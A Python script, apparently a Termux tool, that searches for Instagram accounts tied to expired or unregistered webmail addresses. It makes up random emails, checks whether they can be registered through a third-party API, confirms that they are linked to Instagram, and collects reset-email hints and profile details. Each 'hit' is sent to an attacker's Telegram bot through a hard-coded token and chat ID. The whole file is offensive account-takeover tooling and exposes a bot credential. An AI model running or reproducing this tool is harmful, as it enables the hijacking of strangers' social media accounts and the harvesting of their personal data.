import os
import random
import requests
from threading import Thread
from time import sleep as zzz
from faker import Faker
from user_agent import generate_user_agent
from ms4 import InfoIG, Instagram, RestInsta, UserAgentGenerator



required_packages = ['faker', 'requests', 'user_agent', 'ms4']


for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        os.system(f"pip install {package}")

import os, requests, time, webbrowser
import os,random,sys,time
os.system("pkg install espeak")
os.system("pkg install python-cfonts")
os.system("clear")

from cfonts import render            
output = render('INSTA', colors=['white', 'blue'], align='center')
print("\x1b[1;39m—" * 60)
print(output)
print("~ Programmer : @T5OMAS | ~ ~Programmer: @MAHO_S9 ~")
print("\x1b[1;39m—" * 60)

E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
O = '\x1b[1;37m'


class THOMAS:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.api_urls = {
            "gmx": "https://api-domin-bbc92d0bdbd3.herokuapp.com/gmx={email}",
            "mail.ru": "https://api-domin-bbc92d0bdbd3.herokuapp.com/mail_ru={email}",
            "aol": "https://api-domin-bbc92d0bdbd3.herokuapp.com/aol={email}",
            "yahoo": "https://api-domin-bbc92d0bdbd3.herokuapp.com/yahoo={email}",
            "hotmail": "https://api-domin-bbc92d0bdbd3.herokuapp.com/hotmail={email}",
            "outlook": "https://api-domin-bbc92d0bdbd3.herokuapp.com/hotmail={email}"
        }

    def THOMAS_TELEGRAM(self, email, user_info, rest_email):
        message = f'''
Found Hit
Name : {user_info["name"]}
UserName : @{user_info["username"]}
Email :  {email}
Followers : {user_info["followers"]}
Following : {user_info["following"]}
ID : {user_info["id"]}
Post : {user_info["posts"]}
Reset : {rest_email}

Hit By @Haxkx
        '''
        print(F + message)
        requests.get(f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={message}')
        with open('New_İnsta_Hits.txt', 'a') as f:
            f.write(message + '\n')
    def THOMAS_EMAİLS_CHECK(self, email, domain):
        if domain not in self.api_urls:
            return False
        response = requests.get(self.api_urls[domain].format(email=email)).text
        return '"Is_Available":"true",' in response
    def ch(self, email):
        IG = Instagram.CheckInsta(email)['Is_Available']
        if IG == 'true':
            print(f"{F} ~ Hit Düştü  : {email}")
            self.REST_THOMAS(email)
        elif IG == 'false':
            print(f"{E} ~ Kötü Email : {email}")
        else:
            print(" VPN AC 🔒")
            zzz(10)

    def REST_THOMAS(self, email):
        username = email.split("@")[0]
        try:
            rest_email = RestInsta.Rest(username)["email"]
        except:
            rest_email = " t t t "
        user_info = self.THOMAS_INFO(username)
        self.THOMAS_TELEGRAM(email, user_info, rest_email)

    def THOMAS_INFO(self, username):
        info = InfoIG.Instagram_Info(username)
        return {
            "username": username,
            "name": info["Name"],
            "id": info["ID"],
            "followers": info["Followers"],
            "following": info["Following"],
            "bio": info["Bio"],
            "posts": info["Posts"],
            "is_private": info["Is Private"]
        }
    def THOMAS_CHECK_EMAİLS(self):
        faker = Faker()
        while True:
            try:
                username = faker.user_name()
                domain = random.choice(["gmx.com", "mail.ru", "aol.com", "yahoo.com", "hotmail.com", "outlook.com" , "yopmail.com"])
                email = f"{username}@{domain}"
                if self.THOMAS_EMAİLS_CHECK(email, domain.split('.')[0]):
                    self.ch(email)
                else:
                    print(f"{E} ~ Kötü Mail : {email}")
            except Exception as e:
                print(f"E-posta işlenirken hata oluştu❌: {e}")
                zzz(10)
    def start_threads(self, num_threads=5):
        for _ in range(num_threads):
            Thread(target=self.THOMAS_CHECK_EMAİLS).start()

token = "7472180794:AAEAAdfiykWeXXq7KiuTKyIQ4t9Il03q3RY"
print("\x1b[1;39m—" * 60)
ID = "5195444280"
os.system("clear")
email_checker = THOMAS(token, ID)
email_checker.start_threads()


# @t5omas / @maho_s9 
